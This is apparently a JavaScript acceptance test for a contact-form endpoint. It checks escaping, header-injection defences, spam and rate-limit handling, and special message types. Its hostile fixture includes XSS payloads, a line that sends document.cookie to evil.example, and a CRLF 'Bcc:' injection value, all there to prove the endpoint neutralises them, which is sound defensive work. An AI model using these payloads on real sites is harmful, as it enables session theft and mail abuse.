// Offline acceptance check for the mailbox's escaping.
//
// RUN IT:   ./run-escaping-test.sh          (from this folder)
//
// Why this exists rather than a code review. From the kata:
//
//   "This is worth setting up rather than eyeballing, because it is the one
//    check here that a person reading the code reliably passes and the code
//    reliably fails: the escaping is applied to three fields out of four, or
//    to the text copy of the address and not the link copy, and reading
//    cannot see the difference."
//
// Two earlier installs of this pattern (NinjaGym, and the source build it
// came from) shipped with exactly that bug. So: transpile the REAL endpoint,
// stub ONLY the mail library so the composed mail is handed back instead of
// sent, drive a hostile submission through it, and read every tag in the
// result. Nothing about the escaping is reimplemented here, which is the
// entire point.
//
// Needs no secrets and touches no live inbox.

let handler = null;
let sent = null;
const gate = [];      // the gate table the send cap counts in (16 Oct 2026)
let gateDown = false;

globalThis.Deno = {
  serve: (h) => { handler = h; },
  env: { get: (k) => ({
    RESEND_API_KEY: 're_stub_key',
    CONTACT_TO: 'stub-destination@example.com',
    CONTACT_FROM: 'The mailbox <stub-sender@example.com>',
    SUPABASE_URL: 'https://stub.supabase.co', SUPABASE_SERVICE_ROLE_KEY: 'service-stub',
  })[k] }
};

const realFetch = globalThis.fetch;
globalThis.fetch = async (url, opts) => {
  if (String(url).includes('api.resend.com')) {
    sent = JSON.parse(opts.body);
    return { ok: true, status: 200, text: async () => 'stubbed' };
  }
  // The database function aininja_gate_hit (27 Oct 2026), the same rules in
  // the same order: visitor hour, day ceiling, then record, then held.
  if (String(url).includes('/rest/v1/rpc/aininja_gate_hit')) {
    if (gateDown) return { ok: false, status: 500, headers: new Headers(), text: async () => 'down' };
    const a = JSON.parse(opts.body), now = Date.now();
    const recent = (r, ms) => now - Date.parse(r.at) < ms;
    const answer = (v) => ({ ok: true, status: 200, json: async () => v, text: async () => JSON.stringify(v) });
    const mine = gate.filter(r => r.door === a.p_door);
    if (mine.filter(r => r.ip_hash === a.p_ip_hash && recent(r, 3600e3)).length >= a.p_hour) return answer('visitor');
    const dayN = mine.filter(r => recent(r, 86400e3)).length;
    if (dayN >= a.p_day) return answer('day');
    gate.push({ door: a.p_door, ip_hash: a.p_ip_hash, intake: a.p_intake, at: new Date().toISOString() });
    return answer(a.p_soft_day > 0 && dayN >= a.p_soft_day ? 'held' : 'ok');
  }
  return realFetch(url, opts);
};

await import('./fn.mjs');

const hostile = {
  name: '<img src=x onerror=alert(1)>Mallory',
  // carries a ? and a # so a missing href escape would show up
  email: 'attacker@example.com?subject=Hacked&body=Pwned#anchor',
  subject: '<script>alert(1)</script>',
  message:
    '<a href="https://evil.example">Click here to verify your account</a>\n' +
    '<script>alert("xss")</script>\n' +
    '<span style="display:none">invisible text the owner cannot see</span>\n' +
    '<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">\n' +
    'Ordinary sentence so the message is long enough to skip the nonsense check entirely, which needs 120 characters.',
  website: '',
  elapsedMs: 30000,
  // the source rides in from ?src= on the link, so it is attacker-typed too
  source: '<b onmouseover=alert(1)>linkedin',
};

const res = await handler(new Request('https://x/', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', Origin: 'https://ricktew.com' },
  body: JSON.stringify(hostile),
}));

console.log('visitor sees:', await res.text(), '(status', res.status + ')');
console.log('');
if (!sent) { console.log('FAIL: no mail was composed at all'); process.exit(1); }

const html = sent.html;
const text = sent.text;

// Every tag in the produced mail. Anything not in the allowlist was written
// by the attacker, not by the endpoint.
const MINE = new Set(['table','tr','td','hr','div','/table','/tr','/td','/div']);
const tags = [...html.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9]*)/g)].map(m => m[1].toLowerCase());
const foreign = [...new Set(tags)].filter(t => !MINE.has(t) && !MINE.has('/' + t));

console.log('tags found in the mail :', [...new Set(tags)].join(', '));
console.log('tags I did NOT write   :', foreign.length ? foreign.join(', ') : '(none)');
console.log('');

const checks = [
  ['no foreign tags in the html', foreign.length === 0],
  // Inside a real tag only: the escaped TEXT "&lt;img ... onerror=..." is
  // inert and is exactly what we want to see.
  ['no onerror= inside a live tag', ![...html.matchAll(/<[^>]*>/g)].some(m => /onerror\s*=/i.test(m[0]))],
  ['no <script', !/<script/i.test(html)],
  ['no live href to evil.example', !/href="https:\/\/evil/i.test(html)],
  ['no mailto: link anywhere in the mail', !/mailto:/i.test(html) && !/mailto:/i.test(text)],
  ['name escaped in html', html.includes('&lt;img src=x onerror=alert(1)&gt;Mallory')],
  ['subject carries no markup at all', !/[<>]/.test(sent.subject)],
  ['subject label came from the fixed list', sent.subject.startsWith('AI Ninja Something else:')],
  ['reply_to is the visitor', sent.reply_to === hostile.email],
  ['no newline injected into subject header', !/[\r\n]/.test(sent.subject)],
  ['no newline injected into reply_to header', !/[\r\n]/.test(sent.reply_to)],
  ['destination came from the secret, not the payload', JSON.stringify(sent.to) === '["stub-destination@example.com"]'],
  ['source label came from the fixed list, not the payload', text.includes('Source: Direct, no source on the link') && !html.includes('onmouseover')],
  ['source row is present in the html', /<td[^>]*>Source<\/td>/.test(html)],
];

let bad = 0;
for (const [label, ok] of checks) {
  console.log((ok ? '  PASS  ' : '  FAIL  ') + label);
  if (!ok) bad++;
}
console.log('');
console.log('subject line sent:', JSON.stringify(sent.subject));

// ---- The gauntlet, through the REAL handler ----
//
// The kit's own test scores the function; this drives the probes through the
// endpoint and reads what the endpoint DID: a drop must answer exactly like
// an acceptance (200, ok:true), compose no mail, and write one drop line.
// The four probes are the real ones from the night of 11 to 12 Sep 2026,
// which the previous copy of the check scored 2 and let through.
console.log('');
console.log('-- the gauntlet, through the real handler');
const probes = [
  ['NBRRFThoNaJNvSWZJVOsCCbA', 'thangav.e.l.u.s.en.n.iya.ppa.n@gmail.com', 'APSCFUwhpzfBzWkcBbig'],
  ['RULMjiEseTZnzygGwZHaCA', 'bellachristie@yahoo.com', 'nQwErTyUiOpAsDf'],
  ['qaYfWZPAEqTFeOpmu', 'adea.n.ho.o.v.er@gmail.com', 'xKcVbNmAsDfG'],
  ['gDRzEkKJhuoBXBMFM', 'jmanthei@kemkrest.com', 'pLmOkNiJbUhVgY'],
];
const people = [
  ['Somchai', 'somchai.p@gmail.com', 'Interested'],
  ['McDonald', 'r.mcdonald@gmail.com', 'Call me please'],
];
const realLog = console.log;
let ipN = 0;
async function post(name, email, message, ip = '172.16.0.' + (++ipN)) {
  sent = null;
  const drops = [];
  console.log = (...a) => { if (String(a[0]).startsWith('ricktew-contact drop')) drops.push(a.join(' ')); else realLog(...a); };
  const r = await handler(new Request('https://x/', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Origin: 'https://ricktew.com', 'x-forwarded-for': ip },
    body: JSON.stringify({ name, email, subject: 'hours', message, website: '', elapsedMs: 30000, source: '' }),
  }));
  console.log = realLog;
  return { status: r.status, body: await r.text(), mailed: !!sent, drops };
}
for (const [name, email, message] of probes) {
  const r = await post(name, email, message);
  const ok = r.status === 200 && r.body === '{"ok":true}' && !r.mailed && r.drops.length === 1 && r.drops[0].includes('"reason":"nonsense"');
  console.log((ok ? '  PASS  ' : '  FAIL  ') + 'probe dropped like an acceptance, no mail, one drop line: ' + JSON.stringify(name));
  if (!ok) { bad++; console.log('          got', JSON.stringify(r)); }
}
for (const [name, email, message] of people) {
  const r = await post(name, email, message);
  const ok = r.status === 200 && r.mailed && r.drops.length === 0;
  console.log((ok ? '  PASS  ' : '  FAIL  ') + 'person mailed, nothing dropped: ' + JSON.stringify(name));
  if (!ok) { bad++; console.log('          got', JSON.stringify(r)); }
}
{
  // A perfect submission with no Origin header: not a browser, so a drop,
  // answered like an acceptance.
  sent = null;
  const drops = [];
  console.log = (...a) => { if (String(a[0]).startsWith('ricktew-contact drop')) drops.push(a.join(' ')); else realLog(...a); };
  const r = await handler(new Request('https://x/', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: 'Somchai', email: 'somchai.p@gmail.com', subject: 'hours', message: 'Interested', website: '', elapsedMs: 30000, source: '' }),
  }));
  console.log = realLog;
  const body = await r.text();
  const ok = r.status === 200 && body === '{"ok":true}' && !sent && drops.length === 1 && drops[0].includes('"reason":"no_origin"');
  console.log((ok ? '  PASS  ' : '  FAIL  ') + 'no Origin header: dropped like an acceptance, no mail, one drop line');
  if (!ok) { bad++; console.log('          got', JSON.stringify({ status: r.status, body, mailed: !!sent, drops })); }
}

// ---- The send cap (16 Oct 2026): five an hour per visitor, a hundred a day ----
console.log('');
console.log('-- the send cap, through the real handler');
{
  const say = (ok, label, got) => { console.log((ok ? '  PASS  ' : '  FAIL  ') + label); if (!ok) { bad++; console.log('          got', JSON.stringify(got)); } };
  // Junk the gauntlet drops never reaches the gate, so it costs a person nothing.
  const n0 = gate.length;
  await post(...probes[0], '7.7.7.7');
  say(gate.length === n0, 'a dropped probe writes no gate row', gate.length - n0);

  const runs = [];
  for (let i = 0; i < 6; i++) runs.push(await post(...people[0], '7.7.7.7'));
  say(runs.slice(0, 5).every(r => r.mailed && r.drops.length === 0), 'one visitor: five messages in an hour are mailed', runs.slice(0, 5));
  const sixth = runs[5];
  say(sixth.status === 200 && sixth.body === '{"ok":true}' && !sixth.mailed && sixth.drops.length === 1 && sixth.drops[0].includes('"reason":"rate_visitor"') && sixth.drops[0].includes('Interested'),
    'the sixth is dropped like an acceptance, no mail, the whole message in the drop line', sixth);
  say(gate.every(r => r.door === 'mailbox' && /^[0-9a-f]{32}$/.test(r.ip_hash)) && !JSON.stringify(gate).includes('7.7.7.7'),
    'gate rows: door mailbox, a 32-character hash, never the raw IP', gate.slice(0, 2));
  const other = await post(...people[1], '6.6.6.6');
  say(other.mailed && other.drops.length === 0, 'another visitor in the same hour is still mailed', other);

  // A busy day: a hundred messages already in, from anyone. The 101st still
  // reaches Rick, marked so the Ninja Agent sends nothing to the typed address.
  const fill = (door, n) => { while (gate.filter(r => r.door === door).length < n) gate.push({ door, ip_hash: 'f'.repeat(32), intake: '', at: new Date().toISOString() }); };
  fill('mailbox', 100);
  const late = await post(...people[0], '5.5.5.5');
  const lateMail = sent;
  say(late.mailed && late.drops.length === 0 && lateMail.headers && lateMail.headers['Auto-Submitted'] === 'auto-generated' && lateMail.headers['X-Mailbox-Held'] === 'day' && /Held: More than 100/.test(lateMail.text),
    'the 101st message of the day reaches Rick marked Auto-Submitted and Held, so the Ninja Agent does not reply', { late, headers: lateMail && lateMail.headers });
  const early = await post(...people[1], '5.5.5.6');
  say(early.mailed && sent.headers && sent.headers['X-Mailbox-Held'] === 'day', 'the 102nd is held the same way', sent && sent.headers);
  fill('mailbox', 300);
  const over = await post(...people[0], '5.5.5.7');
  say(!over.mailed && over.drops.length === 1 && over.drops[0].includes('"reason":"rate_day"') && over.drops[0].includes('Interested'),
    'past three hundred in a day: dropped like an acceptance, the whole message in the drop line', over);
  // A full mailbox door never silences a Paid press: notices count apart.
  {
    sent = null;
    const r = await handler(new Request('https://x/', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Origin: 'https://ricktew.com', 'x-forwarded-for': '5.5.5.8' },
      body: JSON.stringify({ name: 'Somchai Prasert', email: 'somchai.p@gmail.com', subject: 'paid', sku: 'AIN-MAMAMIA', message: 'Paid 6,999 baht by PromptPay just now. Baby name Mali.', website: '', elapsedMs: 30000, source: '' }),
    }));
    say(r.status === 200 && sent && /^Paid PromptPay AIN-MAMAMIA/.test(sent.subject) && gate.some(g => g.door === 'notice'),
      'with the mailbox door full, a Paid press still reaches Rick (door notice)', sent && sent.subject);
  }
  // Rows from another door never count against the mailbox.
  gate.length = 0;
  for (let i = 0; i < 120; i++) gate.push({ door: 'upload', ip_hash: 'e'.repeat(32), intake: 'x', at: new Date().toISOString() });
  const mixed = await post(...people[0], '4.4.4.4');
  say(mixed.mailed && mixed.drops.length === 0 && !(sent.headers && sent.headers['Auto-Submitted']), 'upload rows in the same table do not count against the mailbox', mixed);

  // An unreadable count fails closed: no mail, the whole message in the log.
  gateDown = true;
  const down = await post(...people[0], '3.3.3.3');
  say(!down.mailed && down.status === 200 && down.body === '{"ok":true}' && down.drops.length === 1 && down.drops[0].includes('"reason":"gate_unavailable"') && down.drops[0].includes('Interested'),
    'gate table down: dropped like an acceptance, no mail, the whole message in the drop line', down);
  gateDown = false;

  // An oversized body cannot write itself into the log whole.
  const huge = await post('Somchai', 'somchai.p@gmail.com', 'x'.repeat(200000), '3.3.3.4');
  say(!huge.mailed && huge.drops.length === 1 && huge.drops[0].includes('"reason":"too_long"') && huge.drops[0].length <= 20000 + 40,
    'a 200,000-character message: dropped, and the drop line is cut at 20,000', huge.drops[0] && huge.drops[0].length);
}

// ---- The PromptPay Paid press (17 Oct 2026) ----
// The card posts subject "paid" with a SKU. The SKU reaches the mail's
// subject, so it must come from the fixed list; a "paid" without a known SKU
// is an ordinary message; only a Paid notice is marked "do not auto-reply".
console.log('');
console.log('-- the PromptPay Paid press, through the real handler');
{
  const say = (ok, label, got) => { console.log((ok ? '  PASS  ' : '  FAIL  ') + label); if (!ok) { bad++; console.log('          got', JSON.stringify(got)); } };
  gate.length = 0;
  const paid = async (body, ip) => {
    sent = null;
    const r = await handler(new Request('https://x/', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Origin: 'https://ricktew.com', 'x-forwarded-for': ip },
      body: JSON.stringify({ name: 'Somchai', email: 'somchai.p@gmail.com', website: '', elapsedMs: 30000, source: '',
        message: 'Paid by PromptPay: MamaMia, ฿6,999 to build, first month included. Then ฿19,997 a year for the hosting.\nBaby\'s first name: Luna', ...body }),
    }));
    return { status: r.status, body: await r.text(), mail: sent };
  };
  const ok = await paid({ subject: 'paid', sku: 'AIN-MAMAMIA', source: 'gns' }, '9.9.9.1');
  say(ok.mail && ok.mail.subject === 'Paid PromptPay AIN-MAMAMIA: Somchai', 'a Paid press with a listed SKU: subject "Paid PromptPay <SKU>: <name>"', ok.mail && ok.mail.subject);
  say(ok.mail && ok.mail.headers && ok.mail.headers['Auto-Submitted'] === 'auto-generated' && ok.mail.headers['X-PromptPay-Sku'] === 'AIN-MAMAMIA',
    'a Paid notice is marked Auto-Submitted, so the Ninja Agent does not answer it', ok.mail && ok.mail.headers);
  say(ok.mail && ok.mail.text.includes('About: Paid by PromptPay') && ok.mail.text.includes('Via: the PromptPay card on ricktew.com') && ok.mail.text.includes('Source: The GNS page') && ok.mail.text.includes('฿6,999'),
    'the Paid mail says what it is, where it came from, and carries the baht amount', ok.mail && ok.mail.text);
  const forged = await paid({ subject: 'paid', sku: '<b>X</b> FREE MONEY' }, '9.9.9.2');
  say(forged.mail && forged.mail.subject.startsWith('AI Ninja Something else:') && !forged.mail.headers && !/FREE MONEY|<b>/.test(forged.mail.subject),
    'a "paid" with a SKU off the list is an ordinary message, the SKU nowhere in the subject', forged.mail && forged.mail.subject);
  const plain = await paid({ subject: 'hours', sku: 'AIN-MAMAMIA' }, '9.9.9.3');
  say(plain.mail && plain.mail.subject.startsWith('AI Ninja Hours back') && !plain.mail.headers,
    'a SKU on any other subject changes nothing: no Paid subject, no auto-reply mark', plain.mail && plain.mail.subject);
  gate.length = 0;
}

// ---- A Bangkok site find (24 Oct 2026): the box on /partners/locations/ ----
// Subject "site": "Bangkok site find: <name>", marked Auto-Submitted with X-Site-Find,
// Via the location search; every other subject keeps its own Via line.
console.log('');
console.log('-- a Bangkok site find, through the real handler');
{
  const say = (ok, label, got) => { console.log((ok ? '  PASS  ' : '  FAIL  ') + label); if (!ok) { bad++; console.log('          got', JSON.stringify(got)); } };
  gate.length = 0;
  const post = async (body, ip) => {
    sent = null;
    await handler(new Request('https://x/', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Origin: 'https://ricktew.com', 'x-forwarded-for': ip },
      body: JSON.stringify({ name: 'Wanrawee', email: 'wanrawee.k@gmail.com', website: '', elapsedMs: 30000, source: '',
        message: 'Place: a shophouse on Narathiwas Soi 22\nWhere: next to Belle Park\n\nGround floor for rent, about 120 sqm, sign on the door.', ...body }),
    }));
    return sent;
  };
  const m = await post({ subject: 'site', name: 'Shophouse, Narathiwas Soi 22', email: '' }, '9.9.8.1');
  say(m && m.subject === 'Bangkok site find: Shophouse, Narathiwas Soi 22', 'a site find with no email: subject "Bangkok site find: <place>"', m && m.subject);
  say(m && !m.reply_to && !m.text.includes('Email:') && m.text.includes('Place: Shophouse'), 'a site find with no email: no Reply-To, no Email line, the place on top', m && { reply_to: m.reply_to, text: m.text });
  say(m && m.headers && m.headers['Auto-Submitted'] === 'auto-generated' && m.headers['X-Site-Find'] === 'bangkok',
    'a site find is marked Auto-Submitted with X-Site-Find, so the Ninja Agent does not answer it', m && m.headers);
  say(m && m.text.includes('Via: the location search on ricktew.com/partners/locations/') && m.text.includes('Narathiwas Soi 22'),
    'the site find says where it came from and carries the find', m && m.text);
  const noMail = await post({ subject: 'hininja', email: '', message: 'Can I come for one week in January, and is there a womens dorm?' }, '9.9.8.3');
  say(noMail === null, 'any other subject still needs an email: dropped without one', noMail && noMail.subject);
  const q = await post({ subject: 'hininja', message: 'Can I come for one week in January, and is there a womens dorm?' }, '9.9.8.2');
  say(q && q.text.includes('Via: the mailbox on ricktew.com/aininja/') && !q.headers,
    'any other subject keeps the mailbox Via line and no auto-reply mark', q && q.text);
  gate.length = 0;
}

// ---- A training plan from the Ninja Menu on /hininja/ (25 Oct 2026) ----
// Subject "plan": "HI Ninja plan: <name>", Reply-To the visitor, marked Auto-Submitted
// with X-HI-Plan (the Ninja Agent does not answer while they pay), Via the Ninja Menu.
console.log('');
console.log('-- a training plan from the Ninja Menu, through the real handler');
{
  const say = (ok, label, got) => { console.log((ok ? '  PASS  ' : '  FAIL  ') + label); if (!ok) { bad++; console.log('          got', JSON.stringify(got)); } };
  gate.length = 0;
  let n = 0;
  const plan = async (body) => {
    sent = null;
    await handler(new Request('https://x/', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Origin: 'https://ricktew.com', 'x-forwarded-for': '7.7.7.' + (++n) },
      body: JSON.stringify({ name: 'Jamie Lee', email: 'jamie.lee@gmail.com', subject: 'plan', website: '', elapsedMs: 40000, source: '',
        message: 'My two weeks, from the Ninja Menu on the HI Ninja page.\n\nWeek 1: Horse Stance (Stances), Forward Roll (Rolls), Front Kicks (Kicks)\n\nWinJitsu coaching add-on: interested\n\nNext: the checkout.', ...body }),
    }));
    return sent;
  };
  const m = await plan({});
  say(m && m.subject === 'HI Ninja plan: Jamie Lee' && m.reply_to === 'jamie.lee@gmail.com', 'a plan: subject "HI Ninja plan: <name>", Reply-To the visitor', m && { subject: m.subject, reply_to: m.reply_to });
  say(m && m.headers && m.headers['Auto-Submitted'] === 'auto-generated' && m.headers['X-HI-Plan'] === 'hininja',
    'a plan is marked Auto-Submitted with X-HI-Plan, so the Ninja Agent does not answer it', m && m.headers);
  say(m && m.text.includes('Via: the Ninja Menu on the course page') && m.text.includes('Horse Stance (Stances)'),
    'the plan says where it came from and carries the picks', m && m.text);
  const hostile = await plan({ name: 'Jamie <img src=x onerror=alert(1)>', message: 'Week 1: <script>alert(1)</script> Horse Stance' });
  say(hostile && !/<script|<img/i.test(hostile.html) && !/[<>]/.test(hostile.subject), 'a hostile plan: escaped in the html, nothing markup-shaped in the subject', hostile && { subject: hostile.subject });
  const noMail = await plan({ email: '' });
  say(noMail === null, 'a plan without an email is dropped', noMail && noMail.subject);
  gate.length = 0;
}

// ---- An ad click from /gns/ (21 Oct 2026, "Count on our side") ----
// The campaign and the click id are typed by whoever builds the link, so they
// are attacker-typed too: a fixed shape, only with source "gads", a line and
// two headers in the mail, never Auto-Submitted (the Ninja Agent answers it).
console.log('');
console.log('-- an ad click from /gns/, through the real handler');
{
  const say = (ok, label, got) => { console.log((ok ? '  PASS  ' : '  FAIL  ') + label); if (!ok) { bad++; console.log('          got', JSON.stringify(got)); } };
  gate.length = 0;
  let n = 0;
  const ask = async (body) => {
    sent = null;
    await handler(new Request('https://x/', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Origin: 'https://ricktew.com', 'x-forwarded-for': '8.8.8.' + (++n) },
      body: JSON.stringify({ name: 'Priya', email: 'priya.k@gmail.com', subject: 'hininja', website: '', elapsedMs: 30000,
        message: 'About: Gooffy Ninja ShhT!!, from the GNS page.\n\nIs there a room for two?', ...body }),
    }));
    return sent;
  };
  const click = 'gclid:Cj0KCQjw_abc-123XYZ_BwE';
  const ok = await ask({ source: 'gads', adCampaign: '21987654321', adClick: click });
  say(ok && ok.text.includes('Source: Google Ads') && ok.text.includes('Ad: campaign 21987654321, gclid Cj0KCQjw_abc-123XYZ_BwE'),
    'an ad lead: Source Google Ads and the Ad line in the text', ok && ok.text);
  say(ok && /<td[^>]*>Ad<\/td>/.test(ok.html) && ok.html.includes('campaign 21987654321'), 'the Ad row is in the html', ok && ok.html);
  say(ok && ok.headers && ok.headers['X-Ad-Campaign'] === '21987654321' && ok.headers['X-Ad-Click'] === click && !ok.headers['Auto-Submitted'],
    'X-Ad-Campaign and X-Ad-Click set, and NOT Auto-Submitted, so the Ninja Agent still answers', ok && ok.headers);
  say(ok && ok.subject.startsWith('AI Ninja ') && !/gclid|Cj0K/.test(ok.subject), 'the subject is unchanged by the ad', ok && ok.subject);
  const noCid = await ask({ source: 'gads', adCampaign: '0', adClick: 'gbraid:0AAAAADx9' });
  say(noCid && noCid.text.includes('Ad: campaign not on the link, gbraid 0AAAAADx9') && noCid.headers['X-Ad-Click'] === 'gbraid:0AAAAADx9',
    'a click whose link had no cid: "campaign not on the link", the click id kept', noCid && noCid.text);
  const hostileAd = await ask({ source: 'gads', adCampaign: '<b>1</b>', adClick: 'gclid:<script>alert(1)</script>' });
  say(hostileAd && !hostileAd.headers && !/Ad:/.test(hostileAd.text) && !/<script|<b>/.test(hostileAd.html + hostileAd.text.split('\n\n')[0]) && hostileAd.text.includes('Source: Google Ads'),
    'a campaign or click off the shape is left out: no Ad line, no headers, no markup', hostileAd && { text: hostileAd.text, headers: hostileAd.headers });
  const badClick = await ask({ source: 'gads', adCampaign: '123', adClick: 'gclid:abc\r\nBcc: x@evil.example' });
  say(badClick && badClick.headers && badClick.headers['X-Ad-Campaign'] === '123' && !badClick.headers['X-Ad-Click'] && !/evil/.test(JSON.stringify(badClick.headers)),
    'a newline in the click id: the click is dropped, the campaign kept, nothing injected', badClick && badClick.headers);
  const notAd = await ask({ source: 'instagram', adCampaign: '123', adClick: click });
  say(notAd && !notAd.headers && !/Ad:/.test(notAd.text) && notAd.text.includes('Source: Instagram'),
    'ad fields without source "gads" are ignored', notAd && notAd.text);
  gate.length = 0;
}

console.log('');
console.log(bad === 0 ? 'ALL ESCAPING AND GAUNTLET CHECKS PASSED' : bad + ' CHECK(S) FAILED');
process.exit(bad === 0 ? 0 : 1);
